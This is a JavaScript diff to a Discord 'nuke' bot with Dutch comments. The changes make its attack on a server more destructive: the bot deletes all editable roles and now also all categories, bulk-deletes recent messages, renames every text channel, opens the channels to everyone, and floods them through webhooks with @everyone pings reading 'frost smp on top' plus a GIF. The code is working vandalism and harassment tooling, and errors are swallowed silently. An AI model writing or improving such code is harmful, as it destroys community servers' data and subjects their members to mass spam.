@@ -33,7 +33,7 @@ client.on('messageCreate', async message => {
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ **MAX SPEED NUKE** ⚠️\nSpam: ${spamAmount}x per channel`);
+        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x "frost smp on top"`);
     } catch {}
 
     let cancelled = false;
@@ -47,11 +47,16 @@ client.on('messageCreate', async message => {
     if (cancelled) return;
 
     // Rollen verwijderen
-    Promise.all(
-        message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).map(role => role.delete().catch(() => {}))
-    ).catch(() => {});
+    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
+        try { await role.delete(); } catch {}
+    }
 
-    // Alle channels **tegelijkertijd** verwerken
+    // Categorieën verwijderen
+    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
+        try { await cat.delete(); } catch {}
+    }
+
+    // Channels verwerken + spam
     const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
@@ -59,18 +64,17 @@ client.on('messageCreate', async message => {
         try {
             // Oude berichten wissen
             await channel.bulkDelete(100, true).catch(() => {});
-            const oldMsgs = await channel.messages.fetch({ limit: 100 }).catch(() => []);
-            await channel.bulkDelete(oldMsgs, true).catch(() => {});
 
             // Hernoemen + zichtbaar maken
             await channel.setName("Finnson the goat");
+
             await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                 ViewChannel: true,
                 SendMessages: true,
                 ReadMessageHistory: true
             }).catch(() => {});
 
-            // Webhook spam
+            // Webhook spam met "frost smp on top"
             const webhook = await channel.createWebhook({
                 name: WEBHOOK_NAME,
                 avatar: WEBHOOK_AVATAR
@@ -79,7 +83,7 @@ client.on('messageCreate', async message => {
             if (webhook) {
                 for (let i = 0; i < spamAmount; i++) {
                     await webhook.send({
-                        content: `@everyone\n${GIF_URL}`,
+                        content: `frost smp on top\n@everyone\n${GIF_URL}`,
                         username: WEBHOOK_NAME,
                         avatarURL: WEBHOOK_AVATAR
                     }).catch(() => {});
@@ -91,7 +95,6 @@ client.on('messageCreate', async message => {
         } catch (err) {}
     });
 
-    // **Alle channels tegelijk starten**
     await Promise.all(promises);
 
     try {
